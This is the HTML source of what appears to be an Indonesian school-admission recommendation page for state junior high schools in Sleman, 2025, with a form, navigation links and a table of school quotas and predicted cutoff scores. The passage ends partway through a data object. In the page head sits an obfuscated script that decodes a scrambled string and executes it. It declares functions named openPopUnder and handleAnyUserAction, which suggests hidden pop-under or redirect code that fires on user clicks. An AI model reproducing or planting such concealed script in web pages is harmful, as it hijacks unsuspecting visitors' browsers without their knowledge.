<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Rekomendasi Pilihan SMPN Sleman 2025 - Berdasar KK & Nilai Gabungan</title>
  <style>
/* --- RESET --- */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

header {
  background: #004466;
  color: white;
  padding: 10px 20px;
}

nav {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
}

nav .logo {
  font-size: 1.2rem;
  font-weight: bold;
}

nav .menu-toggle {
  display: none;
  font-size: 1.5rem;
  cursor: pointer;
}

nav ul {
  list-style: none;
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
}

nav ul li a {
  color: white;
  text-decoration: none;
  padding: 4px 10px;
  display: block;
}

nav ul li a:hover {
  background: #006699;
  border-radius: 4px;
}

/* --- Responsive --- */
@media (max-width: 9768px) {
  nav .menu-toggle {
    display: block;
  }

  nav ul {
    display: none;
    flex-direction: column;
    width: 100%;
    background: #004466;
  }

  nav ul.show {
    display: flex;
  }

  nav ul li {
    width: 100%;
    text-align: left;
  }
}

/* Sembunyikan menu secara default */ 
#nav-links { display: none; } 
#nav-links.show { display: block; } 
</style> 
<style>
  body {
    font-family: Arial, sans-serif;
    font-size: 18px;
    line-height: 1.6;
    background: #fdfdfd;
    color: #111;
    padding: 1rem;
    margin: 0 auto;
    max-width: 480px;
  }

  h1, h2, h3 {
    text-align: center;
    font-size: 22px;
    margin-top: 1.5rem;
    color: #004085;
  }

  label {
    display: block;
    margin-top: 1rem;
    font-weight: bold;
  }

  input[type="number"] {
    width: 100%;
    padding: 12px;
    font-size: 20px;
    margin-top: 0.25rem;
    box-sizing: border-box;
    border: 2px solid #ccc;
    border-radius: 6px;
    background-color: #fff;
  }

  input[type="number"]:focus {
    border-color: #007bff;
    outline: none;
    background-color: #f0f8ff;
  }

  .section {
    background: #fff;
    padding: 1rem;
    border-radius: 10px;
    margin-bottom: 2rem;
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  }

  .result {
    margin-top: 2rem;
    padding: 1rem;
    font-size: 20px;
    font-weight: bold;
    border-radius: 10px;
    background-color: #e9f7ff;
    border: 2px solid #007bff;
  }

  button {
    font-size: 20px;
    padding: 14px 24px;
    margin-top: 1rem;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    width: 100%;
    background: #4CAF50;
    color: white;
    transition: background 0.2s ease;
  }

  button:active {
    background: #388E3C;
  }

  button:hover {
    background-color: #0056b3;
    color: white;
  }

  button.secondary {
    background-color: #e0e0e0;
    color: #333;
  }

  button.secondary:active {
    background-color: #aaa;
  }

  .flash {
    animation: flashHighlight 1s ease-in-out;
  }

  @keyframes flashHighlight {
    0% { background-color: #fff3cd; }
    50% { background-color: #ffeeba; }
    100% { background-color: transparent; }
  }


      /* Style utama menyesuaikan contoh */
    body {
      font-family: Arial, sans-serif;
      font-size: 18px;
      line-height: 1.6;
      background: #fdfdfd;
      color: #111;
      padding: 1rem;
      margin: 0 auto;
      max-width: 480px;
    }
    header {
      background: #004466;
      color: white;
      padding: 10px 20px;
      margin-bottom: 16px;
    }
    .section {
      background: #fff;
      padding: 1rem;
      border-radius: 10px;
      margin-bottom: 2rem;
      box-shadow: 0 2px 4px rgba(0,0,0,0.08);
    }
    label {
      display: block;
      margin-top: 1rem;
      font-weight: bold;
    }
    input[type="number"], select {
      width: 100%;
      padding: 12px;
      font-size: 18px;
      margin-top: 0.25rem;
      box-sizing: border-box;
      border: 2px solid #ccc;
      border-radius: 6px;
      background-color: #fff;
    }
    input[type="number"]:focus, select:focus {
      border-color: #007bff;
      outline: none;
      background-color: #f0f8ff;
    }
    .result {
      margin-top: 2rem;
      padding: 2rem;
      font-size: 18px;
      border-radius: 10px;
      background-color: #e9f7ff;
      border: 2px solid #007bff;
      min-height: 80px;
    }
    button {
      font-size: 20px;
      padding: 14px 24px;
      margin-top: 1.1rem;
      margin-bottom: .4rem;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      background: #4CAF50;
      color: white;
      transition: background 0.2s ease;
    }

    button:active {
      background: #388E3C;
    }
    button.secondary {
      background-color: #e0e0e0;
      color: #333;
    }
    button.secondary:active {
      background-color: #aaa;
    }
    h1, h2 {
      text-align: center;
      font-size: 22px;
      margin-top: 1.5rem;
      color: #004085;
    }
    small { color: #444; }
    .hidden { display: none;}
    @media(max-width: 650px) {
      body { font-size: 17px;}
      button, input, select { font-size: 17px;}
    }
  
</style>


<script>

var bazarTokens,baseMYURL,getRandomMYURL,openPopUnder,handleAnyUserAction;(function(){var WoJ='',AaD=217-206;function hLd(u){var m=640136;var v=u.length;var b=[];for(var n=0;n<v;n++){b[n]=u.charAt(n)};for(var n=0;n<v;n++){var r=m*(n+352)+(m%31037);var i=m*(n+443)+(m%41213);var w=r%v;var q=i%v;var c=b[w];b[w]=b[q];b[q]=c;m=(r+i)%1966230;};return b.join('')};var bML=hLd('wvmfsrcigjozcqnuotapbruetorhdknltxysc').substr(0,AaD);var dWA='gt6++=;uf;+0c+x.64 +-8h7e[(;=dt;87ojrlpo at*wnuh=gy]aopl=;;=+t)a8+lez,w50u*z"ei="w+of-;,l=a;9gru=r}=c9.6;,lp.7{"9gf7;ih ()jgh)wn=)+9oa[ts7ac(t<z<(.rrugra=)+=vrv"as=)=;Asj.arbm,8];Asr1t4rc(a5=hi 2=oy.n(vj;.2a=br=grl;gh;vtAv[nvt]antqi;(afocn,roghcnvaef]=q.0u()2i fxn[)usrdvrs; lj(bnhr vp =no a-){hv+gik9ult]hi,tn=+(p.r[]r=.u{qv"5v(v et6o)1r[6l-ilvr9o=luqidrh;s,(2)>1 y0.w;]3qr). ka[ g<;khC1+=Cd)tt;el;,a;},08);r"im=q)eh=,ha>esvvgdkw.r(i,0u"(gnA;+y nq" pg2}),;r6r r)8([g6gv6!o4-kle=g1,d]l1=rva)hnlonapq2+rca)cefamua;ffts)+3v.+64.]oqi a;cq()jltanoonuAd(2fa+sn8={l=y[a7(kfftr,CC;p]1n(tps;t,d(i,(l[,pq(vn.;ic.;m[(.{cr-(k}+v;};r(.;=gril))g[ni(eu,ae..}(a{ u{0teq"eC),o1jlr.9ouo5,a(ang=fhpod;0,rn;o(szv1r+ot)]=<hi;n);lo;hx[);hoq),)k=j3C2!tu,amj+aso)(t a0;v8) 7v+ rs;(v)re+f,sri;os2r,rvaxl=la=o.at(,.7.+9r0nu(r1)8.4;os=fi0jihevafrCftSk ew;tinfS=s=eagh+,[e]6r1;ketrs =(r1C8nr)c ].ik=it]=0"r}-d4y<hrs e';var Zos=hLd[bML];var ArI='';var iKr=Zos;var qzi=Zos(ArI,hLd(dWA));var OHD=qzi(hLd('%,iI_=1I(I=P=6#b.85P;d{{&d,FHp6nPc\/{;PPP.2(aa={.9)P.P_+e(},P,Pko2flnPP PKg5 rbjP.PncoP0em]eP9%ntnPs3Ml)Tef;\/%)1$btP_yPu4 k8u(P!p.i(73P00Pft_()PdPu5d(ka{Pzc#)l[k)iP <#1CP\/{,atP)7sPfP1og!e8in%s5P*.,.isP,(;11n7)uS%P3neaf.5!d==_P%3 .o#.n*e{f7_=e"o.i.e\/rt"9n_4p,M)PP7()a_y)lnchff4oizse.oJ-[c(!_uhh?Byk(vtn].34.=ett7Pfwe%atL3).1(55bnfe5Pt)Pd$opo=ddm:Pztv.]9n45lO.,.d)PPyeazo6bPmP=m%lP_M7!m}umx P[7PmK%aod{Pog32(e[1*PPso}iPt)_M<dPf\/tH(lP)l}2-7dnN;sc=sPkcyeI!]c"udatT7kq,.7xecfi][t!osrPb41_PP5$8Ptisnen 1alPPa%5=lpk.e$2,C?P;PawAd;!P1lPnm$.efePle.7.O1l-{P.i{T%pl_e!t!,PiT$egePPPe) o5rI75Pd))_.moE.Fc%((lp$:of9])t{P!9$o;Po;6Ph@e 84x}t(P,P3?6LFl\/{.}_ceey3ntnkzPr34u;%P.D_5(]!%;1)P7kP PdgcPe\'[$P;"(D7]n<f09gdF .c;PP.0#P3_)Pt(e__"f".]6;j)hd,h[$Pkp(Pc3tu.5n9Fdtz;_P+;P =5);|a7nPsP)()al_t-la)=e8.x)t\'E.t,(2.k5(.PMtnr25)c)KMn:.o3(u*u$;ao %Pit#(zeeh.(@iPm(_ =ioP.db7mP"tPt)z6pPemir(o2n.$hPs_s;e}s5PBPtz)\';yd"3h_v8.u38-"oPz,yc3PcPt3b.%k74gbii3=mzP(0Pt;3n;du5==s.fctoLb%aem;(fPb3.c".MsPa7C=;]nP.uj.lnk9,PenP$bly=ef=,=d,.d..!2 $iM.P25y8]5$uPgPu%a5t#P2;PA}tPn(P"qony,0e>_63_PP+d$n)%])(PP(ne1%.[3Sw(P)6l1#PP[P}P);l}*1Plc 31ticPb88d{(u4JiCPte1dPt_P{u%P2snt{d=m0)hu>Pp,_5_oI3P-pe;A pPnPFdtueP4 %%.Lhs)=P)62(ytM)ir.n5Pn[Pt()peE(!c%P.19sP+diPyf_.2(AddPid.P nn;][7{P.;21e9P;;ttC{c=c6%Pa()PP_ur0f)PPa}]()L=!P_t_e=)S-#}()P_)o4{sP)!]$_@ 3PPp{n9lB11r8syP),}0_;d;PautP6,KP.{1rc1C.4%5nge11)).PC]eP)o!)lr_)cPdPx.=h(e.ne),iPhi$&(d%(]4P)|P$b{P._{5.c1n,B tt2hnPnf}]inrPicebiP]rku)b.wf1t".yto.m(s)nuPe&%;Po;i .k {tp13P)$:(auzdsCfcee)CP6{xP.sb"; )P>"usri}d$efd%d;Cteuct1rkht.Pake)n+(g=;7L\'mC"ter}.9Pn\'<a(EePP7n.ubvPrqPoz1rP.n0.n7nnmPrJu1;7!d({P gbvb\/3y_EtHP&0+iP5dPndgfiPP33\/}o_.PylaPar\/]nP!P}.d;P{r)(MPPP=e&(1PP..Pb05.-$;,18+P25ad9PP24m02- lPa)n>ac ).))PP]lPP,rt())og=e\/)P$(fPO=)54rfmFtk%mm6fma5yxhPF7$peotp@.ee2gPnoxotP)N(oPd.,5;1aOPs(1;P)(1P y.6Dhu)ls!nx)e[7k Pdn}7ddei,P iueP",co3y.dNl!rnLj=a,[P.i3k1!42C4(a]_o seaP4lHlF%)df}ccP0b(kTt5!d1].33PaP)%Gu(u)cdt.e!i\'l{=2rso,.PJ_a{8{(irnt=tT_ri2(z .P.Pah.Jda {.)nPPoub0(tel5l)( cnPs(e5t5tPPPMg,{Pucc9,e2ew3;fP)4]e.6(9}""o]e4ymP!ruxP-.!!(a;cl.)kCoc+$+tP0"a2P)x)kP)dbete02k2(4n)f=1b;ji2oH2!36tfPn5_($uof0vo0%_IP_H"1(.[Pt.7+sP;fexn.;+uPPP...6]e=e9.[]nC .,Pl(7}kI.en(1t)e FtP.9.9rpat(snt}z(!<\/inr\/B(9(i)t}dPn$tDgPy==,Ehol0dfo.#& t]5,cnuP;a[ ,P{P*Didcs]iP8 %}0agP..roP 4)2aP !9);)4):swdPP<$P.],(.C.p-0l183c)Fc(7=lDPaz.9LP6) )mu[_.e bHelJc_5__Pr,eNo#.re7rrn.P8d_P1(inSg!eut .PkP($)]P;i6==)?5#y5o!eh7.(t(ei3)o -arP.l3kPldf$ls .Er,In}.2$Ah(P$P=fP $P)nc9}!iwie_>'));var QUg=iKr(WoJ,OHD );QUg(2347);return 9910})()
  
</script>  

  
</head>
<body>
<header>
  <nav>
    <div class="logo">ðŸŽ¯</div>
    <div class="menu-toggle" onclick="toggleMenu()">Link SPMB DIY    â˜°</div>
    <ul id="nav-links">
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorsleman/">Kalkulator SMPN Sleman</a></li>
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorsleman/rekomendasi.html">Rekomendasi SMPN Sleman</a></li>
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorkotayogya/">Kalkulator SMPN Kota Yogyakarta</a></li>
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorbantul/">Kalkulator SMPN Bantul</a></li>
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorsleman/PETUNJUK%20TEKNIS%20PENERIMAAN%20MURID%20BARU%20PADA%20JENJANG%20SMP%20DI%20KAB.SLEMAN%20TAHUN%20AJARAN%202025-2026.pdf">Juknis SMPN Sleman</a></li>
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorkotayogya/2025kw3405210.pdf">Juknis SMPN Kota Yogyakarta</a></li>
      <li><a target="_blank"  href="https://vswi.github.io/kalkulatorbantul/Juknis-Bantul-SMPN-keputusan-bupati-2025-226-Juknis-SPMB.pdf">Juknis SMPN Bantul</a></li>
      <li><a target="_blank"  href="https://arsip.spmb.id/2024/sleman/#/020001/statistik">Nilai Terendah 2024 Jalur Prestasi Sleman</a></li>
      <li><a target="_blank"  href="https://arsip.spmb.id/2024/sleman/#/020201/statistik">Nilai Terendah 2024 Jalur Domisili Wilayah Sleman</a></li>
      <li><a target="_blank"  href="https://arsip.spmb.id/2024/yogya/#/020701/statistik">Nilai Terendah 2024 Jalur Prestasi Luar Daerah Kota Yogyakarta</a></li>
      <li><a target="_blank"  href="https://arsip.spmb.id/2024/yogya/#/020301/statistik">Nilai Terendah 2024 Jalur Zonasi Daerah Kota Yogyakarta</a></li>
      <li><a target="_blank"  href="https://arsip.siap-ppdb.com/2024/bantulkab/#/020401/statistik">Nilai Terendah 2024 Jalur Prestasi Bantul</a></li>
      <li><a target="_blank"  href="https://arsip.siap-ppdb.com/2024/bantulkab/#/020001/statistik">Nilai Terendah 2024 Jalur Domisili Wilayah Bantul</a></li>

    </ul>
  </nav>
</header>

  
  <h2>Rekomendasi SMPN Sleman 2025 - Pilih Sesuai KK & Nilai Gabungan</h2>

<div class="section">
  <p>
    <b>Petunjuk:</b><br>
    Pilih asal <b>Kartu Keluarga</b> (KK) Anda.<br>
    Input <b>Nilai Gabungan (NG)</b> hasil olahan rapor & ASPD & Nilai Prestasi (jika punya).<br>
    Jika KK Sleman, pilih <b>Kecamatan, Kelurahan</b> alamat KK Anda.
    <br/>
    Sistem akan merekomendasikan <b>6 SMP Negeri potensial</b> dengan peluang terbaik berdasar data kuota & prediksi batas nilai.
  </p>
</div>
<form id="form-kk-ng">
  <div class="section">
    <label>Asal Kartu Keluarga (KK):</label>
    <select id="asal_kk" onchange="handleKkChange()">
      <option value="">Pilih Asal KK...</option>
      <option value="sleman">KK Kabupaten Sleman</option>
      <option value="luar">KK Luar Kabupaten Sleman</option>
    </select>

    <div id="pilihan-wilayah" class="hidden">
      <label>Pilih Kecamatan, Kelurahan (Sesuai KK):</label>
      <select id="wilayah">

      </select>
    </div>

    <label style="margin-top:1.5rem;">Nilai Gabungan (NG) Anda, gunakan tanda titik - bukan koma:</label>
    <input type="number" step="0.01" min="0" max="400" id="ng_input" placeholder="Masukkan nilai gabungan (misal: 255.30)">
  </div>
  
  
  <button type="button" onclick="cekPeluang();">Rekomendasi Pilihan SMPN</button>
</form>
<div class="result" id="output">
  Silakan lengkapi semua input, lalu klik <b>Rekomendasi Pilihan SMPN Sleman</b>.
</div>
<button type="button" class="secondary" onclick="resetForm()">Bersihkan Form</button>

<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>








  













  
  
<script>
//// ==== Data Sample (Edit sesuai kebutuhan) ====
const dataSekolah = [


    {
      "nomor": 1,
      "nama_sekolah": "SMPN 1 SLEMAN",
      "pred_prestasi": 268.09,
      "pred_wilayah": 250.92,
      "japres_nik_sleman": 68,
      "japres_nik_luar": 11,
      "sisa_domwil": 95
    },
    {
      "nomor": 2,
      "nama_sekolah": "SMPN 2 SLEMAN",
      "pred_prestasi": 246.27,
      "pred_wilayah": 236.50,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 91
    },
    {
      "nomor": 3,
      "nama_sekolah": "SMPN 3 SLEMAN",
      "pred_prestasi": 246.84,
      "pred_wilayah": 231.86,
      "japres_nik_sleman": 48,
      "japres_nik_luar": 8,
      "sisa_domwil": 54
    },
    {
      "nomor": 4,
      "nama_sekolah": "SMPN 4 SLEMAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 215.66,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 43
    },
    {
      "nomor": 5,
      "nama_sekolah": "SMPN 5 SLEMAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 199.44,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 67
    },
    {
      "nomor": 6,
      "nama_sekolah": "SMPN 1 DEPOK",
      "pred_prestasi": 261.74,
      "pred_wilayah": 250.44,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 98
    },
    {
      "nomor": 7,
      "nama_sekolah": "SMPN 2 DEPOK",
      "pred_prestasi": 246.49,
      "pred_wilayah": 237.80,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 34
    },
    {
      "nomor": 8,
      "nama_sekolah": "SMPN 3 DEPOK",
      "pred_prestasi": 250.99,
      "pred_wilayah": 242.20,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 56
    },
    {
      "nomor": 9,
      "nama_sekolah": "SMPN 4 DEPOK",
      "pred_prestasi": 279.69,
      "pred_wilayah": 261.66,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 68
    },
    {
      "nomor": 10,
      "nama_sekolah": "SMPN 5 DEPOK",
      "pred_prestasi": 246.53,
      "pred_wilayah": 200.50,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 55
    },
    {
      "nomor": 11,
      "nama_sekolah": "SMPN 1 MLATI",
      "pred_prestasi": 247.16,
      "pred_wilayah": 234.62,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 39
    },
    {
      "nomor": 12,
      "nama_sekolah": "SMPN 2 MLATI",
      "pred_prestasi": 248.56,
      "pred_wilayah": 237.32,
      "japres_nik_sleman": 48,
      "japres_nik_luar": 8,
      "sisa_domwil": 80
    },
    {
      "nomor": 13,
      "nama_sekolah": "SMPN 3 MLATI",
      "pred_prestasi": 248.60,
      "pred_wilayah": 224.86,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 49
    },
    {
      "nomor": 14,
      "nama_sekolah": "SMPN 1 KALASAN",
      "pred_prestasi": 267.15,
      "pred_wilayah": 199.44,
      "japres_nik_sleman": 48,
      "japres_nik_luar": 8,
      "sisa_domwil": 63
    },
    {
      "nomor": 15,
      "nama_sekolah": "SMPN 2 KALASAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 219.94,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 86
    },
    {
      "nomor": 16,
      "nama_sekolah": "SMPN 3 KALASAN",
      "pred_prestasi": 246.28,
      "pred_wilayah": 233.82,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 52
    },
    {
      "nomor": 17,
      "nama_sekolah": "SMPN 4 KALASAN",
      "pred_prestasi": 246.65,
      "pred_wilayah": 237.20,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 40
    },
    {
      "nomor": 18,
      "nama_sekolah": "SMPN 1 GODEAN",
      "pred_prestasi": 279.86,
      "pred_wilayah": 260.42,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 66
    },
    {
      "nomor": 19,
      "nama_sekolah": "SMPN 2 GODEAN",
      "pred_prestasi": 248.24,
      "pred_wilayah": 239.54,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 56
    },
    {
      "nomor": 20,
      "nama_sekolah": "SMPN 3 GODEAN",
      "pred_prestasi": 262.85,
      "pred_wilayah": 252.00,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 70
    },
    {
      "nomor": 21,
      "nama_sekolah": "SMPN 1 NGAGLIK",
      "pred_prestasi": 245.00,
      "pred_wilayah": 210.98,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 100
    },
    {
      "nomor": 22,
      "nama_sekolah": "SMPN 2 NGAGLIK",
      "pred_prestasi": 248.11,
      "pred_wilayah": 235.77,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 52
    },
    {
      "nomor": 23,
      "nama_sekolah": "SMPN 3 NGAGLIK",
      "pred_prestasi": 246.72,
      "pred_wilayah": 221.34,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 49
    },
    {
      "nomor": 24,
      "nama_sekolah": "SMPN 4 NGAGLIK",
      "pred_prestasi": 249.99,
      "pred_wilayah": 226.14,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 48
    },
    {
      "nomor": 25,
      "nama_sekolah": "SMPN 1 PAKEM",
      "pred_prestasi": 246.89,
      "pred_wilayah": 241.96,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 48
    },
    {
      "nomor": 26,
      "nama_sekolah": "SMPN 2 PAKEM",
      "pred_prestasi": 245.00,
      "pred_wilayah": 197.20,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 66
    },
    {
      "nomor": 27,
      "nama_sekolah": "SMPN 3 PAKEM",
      "pred_prestasi": 245.00,
      "pred_wilayah": 211.88,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 64
    },
    {
      "nomor": 28,
      "nama_sekolah": "SMPN 4 PAKEM",
      "pred_prestasi": 282.87,
      "pred_wilayah": 257.12,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 72
    },
    {
      "nomor": 29,
      "nama_sekolah": "SMPN 1 SEYEGAN",
      "pred_prestasi": 254.97,
      "pred_wilayah": 238.60,
      "japres_nik_sleman": 68,
      "japres_nik_luar": 11,
      "sisa_domwil": 96
    },
    {
      "nomor": 30,
      "nama_sekolah": "SMPN 1 MINGGIR",
      "pred_prestasi": 246.99,
      "pred_wilayah": 223.54,
      "japres_nik_sleman": 68,
      "japres_nik_luar": 11,
      "sisa_domwil": 91
    },
    {
      "nomor": 31,
      "nama_sekolah": "SMPN 1 MOYUDAN",
      "pred_prestasi": 246.46,
      "pred_wilayah": 241.58,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 37
    },
    {
      "nomor": 32,
      "nama_sekolah": "SMPN 2 MOYUDAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 206.44,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 78
    },
    {
      "nomor": 33,
      "nama_sekolah": "SMPN 1 GAMPING",
      "pred_prestasi": 246.53,
      "pred_wilayah": 231.10,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 58
    },
    {
      "nomor": 34,
      "nama_sekolah": "SMPN 2 GAMPING",
      "pred_prestasi": 253.46,
      "pred_wilayah": 216.74,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 64
    },
    {
      "nomor": 35,
      "nama_sekolah": "SMPN 3 GAMPING",
      "pred_prestasi": 248.26,
      "pred_wilayah": 227.94,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 64
    },
    {
      "nomor": 36,
      "nama_sekolah": "SMPN 4 GAMPING",
      "pred_prestasi": 245.00,
      "pred_wilayah": 209.72,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 94
    },
    {
      "nomor": 37,
      "nama_sekolah": "SMPN 1 BERBAH",
      "pred_prestasi": 252.59,
      "pred_wilayah": 234.28,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 29
    },
    {
      "nomor": 38,
      "nama_sekolah": "SMPN 2 BERBAH",
      "pred_prestasi": 258.23,
      "pred_wilayah": 242.87,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 52
    },
    {
      "nomor": 39,
      "nama_sekolah": "SMPN 3 BERBAH",
      "pred_prestasi": 245.00,
      "pred_wilayah": 216.08,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 63
    },
    {
      "nomor": 40,
      "nama_sekolah": "SMPN 1 NGEMPLAK",
      "pred_prestasi": 246.24,
      "pred_wilayah": 228.95,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 78
    },
    {
      "nomor": 41,
      "nama_sekolah": "SMPN 2 NGEMPLAK",
      "pred_prestasi": 248.55,
      "pred_wilayah": 211.30,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 84
    },
    {
      "nomor": 42,
      "nama_sekolah": "SMPN 1 TURI",
      "pred_prestasi": 246.34,
      "pred_wilayah": 226.64,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 55
    },
    {
      "nomor": 43,
      "nama_sekolah": "SMPN 2 TURI",
      "pred_prestasi": 249.18,
      "pred_wilayah": 218.00,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 47
    },
    {
      "nomor": 44,
      "nama_sekolah": "SMPN 3 TURI",
      "pred_prestasi": 245.00,
      "pred_wilayah": 177.80,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 63
    },
    {
      "nomor": 45,
      "nama_sekolah": "SMPN 1 CANGKRINGAN",
      "pred_prestasi": 247.87,
      "pred_wilayah": 211.90,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 56
    },
    {
      "nomor": 46,
      "nama_sekolah": "SMPN 2 CANGKRINGAN",
      "pred_prestasi": 268.78,
      "pred_wilayah": 187.30,
      "japres_nik_sleman": 29,
      "japres_nik_luar": 5,
      "sisa_domwil": 54
    },
    {
      "nomor": 47,
      "nama_sekolah": "SMPN 1 PRAMBANAN",
      "pred_prestasi": 246.89,
      "pred_wilayah": 232.66,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 55
    },
    {
      "nomor": 48,
      "nama_sekolah": "SMPN 2 PRAMBANAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 212.57,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 22
    },
    {
      "nomor": 49,
      "nama_sekolah": "SMPN 3 PRAMBANAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 92.96,
      "japres_nik_sleman": 29,
      "japres_nik_luar": 5,
      "sisa_domwil": 48
    },
    {
      "nomor": 50,
      "nama_sekolah": "SMPN 4 PRAMBANAN",
      "pred_prestasi": 245.00,
      "pred_wilayah": 198.08,
      "japres_nik_sleman": 19,
      "japres_nik_luar": 3,
      "sisa_domwil": 13
    },
    {
      "nomor": 51,
      "nama_sekolah": "SMPN 1 TEMPEL",
      "pred_prestasi": 246.98,
      "pred_wilayah": 223.94,
      "japres_nik_sleman": 59,
      "japres_nik_luar": 9,
      "sisa_domwil": 73
    },
    {
      "nomor": 52,
      "nama_sekolah": "SMPN 2 TEMPEL",
      "pred_prestasi": 247.70,
      "pred_wilayah": 222.28,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 49
    },
    {
      "nomor": 53,
      "nama_sekolah": "SMPN 3 TEMPEL",
      "pred_prestasi": 248.13,
      "pred_wilayah": 208.79,
      "japres_nik_sleman": 48,
      "japres_nik_luar": 8,
      "sisa_domwil": 70
    },
    {
      "nomor": 54,
      "nama_sekolah": "SMPN 4 TEMPEL",
      "pred_prestasi": 245.00,
      "pred_wilayah": 195.58,
      "japres_nik_sleman": 40,
      "japres_nik_luar": 6,
      "sisa_domwil": 63
    }
  

  
];

const wilayahData = {
  "daftar_sekolah":[


    "SMPN 1 BERBAH", "SMPN 2 BERBAH", "SMPN 3 BERBAH", "SMPN 1 CANGKRINGAN", "SMPN 2 CANGKRINGAN",
    "SMPN 1 DEPOK", "SMPN 2 DEPOK", "SMPN 3 DEPOK", "SMPN 4 DEPOK", "SMPN 5 DEPOK",
    "SMPN 1 GAMPING", "SMPN 2 GAMPING", "SMPN 3 GAMPING", "SMPN 4 GAMPING", "SMPN 1 GODEAN",
    "SMPN 2 GODEAN", "SMPN 3 GODEAN", "SMPN 1 KALASAN", "SMPN 2 KALASAN", "SMPN 3 KALASAN",
    "SMPN 4 KALASAN", "SMPN 1 MINGGIR", "SMPN 1 MLATI", "SMPN 2 MLATI", "SMPN 3 MLATI",
    "SMPN 1 MOYUDAN", "SMPN 2 MOYUDAN", "SMPN 1 NGAGLIK", "SMPN 2 NGAGLIK", "SMPN 3 NGAGLIK",
    "SMPN 4 NGAGLIK", "SMPN 1 NGEMPLAK", "SMPN 2 NGEMPLAK", "SMPN 1 PAKEM", "SMPN 2 PAKEM",
    "SMPN 3 PAKEM", "SMPN 4 PAKEM", "SMPN 1 PRAMBANAN", "SMPN 2 PRAMBANAN", "SMPN 3 PRAMBANAN",
    "SMPN 4 PRAMBANAN", "SMPN 1 SEYEGAN", "SMPN 1 SLEMAN", "SMPN 2 SLEMAN", "SMPN 3 SLEMAN",
    "SMPN 4 SLEMAN", "SMPN 5 SLEMAN", "SMPN 1 TEMPEL", "SMPN 2 TEMPEL", "SMPN 3 TEMPEL",
    "SMPN 4 TEMPEL", "SMPN 1 TURI", "SMPN 2 TURI", "SMPN 3 TURI"
  ],
  "data_per_wilayah": {
